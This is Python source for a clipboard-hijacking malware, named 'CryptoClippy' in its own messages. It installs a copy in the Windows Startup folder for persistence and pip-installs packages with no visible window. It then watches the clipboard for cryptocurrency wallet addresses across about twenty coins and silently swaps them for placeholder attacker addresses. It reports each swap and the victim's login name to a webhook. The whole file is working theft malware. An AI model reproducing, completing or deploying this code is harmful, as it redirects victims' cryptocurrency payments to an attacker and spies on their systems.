
import re
import os
import time
import random
import shutil
import subprocess
import sys

hook = '' 
thecode = ''''''

appdata = os.getenv('APPDATA')
startupfolder = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
if thecode:
    with open(os.path.join(startupfolder, 'WinCheck.pyw'), 'w', encoding='utf-8') as f:
        f.write(thecode)

coinsssss = {
    '|BTC|'      : r'\b(?:bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b',
    '|ETH|'      : r'\b0x[a-fA-F0-9]{40}\b',
    '|BNB|'      : r'\bbnb1[0-9a-z]{38}\b',
    '|XRP|'      : r'\br[0-9a-zA-Z]{24,34}\b',
    '|ADA|'      : r'\baddr1[0-9a-z]{58}\b',
    '|SOL|'      : r'\b(?![LM3l])[1-9A-HJ-NP-Za-km-z]{43,44}\b(?<![LM3][1-9A-HJ-NP-Za-km-z]{33})',
    '|DOGE|'     : r'\bD[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}\b',
    '|TRX|'      : r'\bT[A-HJ-NP-Za-km-z1-9]{33}\b',
    '|MATIC|'    : r'\b0x[a-fA-F0-9]{40}\b',
    '|LTC|'      : r'\b(?:L[a-km-zA-HJ-NP-Z1-9]{26,33}|M[a-km-zA-HJ-NP-Z1-9]{26,33}|3[a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1q[a-z0-9]{39}|ltc1p[a-z0-9]{58})\b(?![0-9A-Za-z])',
    '|SHIB|'     : r'\b0x[a-fA-F0-9]{40}\b',
    '|AVAX|'     : r'\bX-avax1[0-9a-z]{38}\b',
    '|DAI|'      : r'\b0x[a-fA-F0-9]{40}\b',
    '|UNI|'      : r'\b0x[a-fA-F0-9]{40}\b',
    '|WBTC|'     : r'\b0x[a-fA-F0-9]{40}\b',
    '|LINK|'     : r'\b0x[a-fA-F0-9]{40}\b',
    '|XLM|'      : r'\bG[A-Z2-7]{55}\b',
    '|ATOM|'     : r'\bcosmos1[0-9a-z]{38}\b',
    '|ETC|'      : r'\b0x[a-fA-F0-9]{40}\b',
    '|XMR|'      : r'\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b',
    '|USDT-ERC20|': r'\b0x[a-fA-F0-9]{40}\b',
    '|USDC-ERC20|': r'\b0x[a-fA-F0-9]{40}\b',
}

subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], creationflags=subprocess.CREATE_NO_WINDOW)

def launchnotif():
    if hook:
        try:
            import requests
            if hook:
                requests.post(hook, json={'content': f'``{os.getlogin()} Connected to CryptoClippy``'})
        except:
            pass

def clipnotif(old, new):
    if hook:
        try: 
            import requests
            if hook:
                requests.post(hook, json={'content': f'``{os.getlogin()} Got clipped`` ``Old - {old}`` ``New - {new}``'})
        except:
            pass

def startclipping():
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyperclip'], creationflags=subprocess.CREATE_NO_WINDOW)
    import pyperclip
    alladdys = [addy for addy, pattern in coinsssss.items()]

    while True:
        try:
            clipboard = pyperclip.paste().strip()
            for addy, pattern in coinsssss.items():
                if re.fullmatch(pattern, clipboard):
                    if clipboard in alladdys:
                        pass
                    else:
                        pyperclip.copy(addy)
                        clipnotif(clipboard, addy)
            time.sleep(0.25)

        except:
            time.sleep(1)

launchnotif()
startclipping()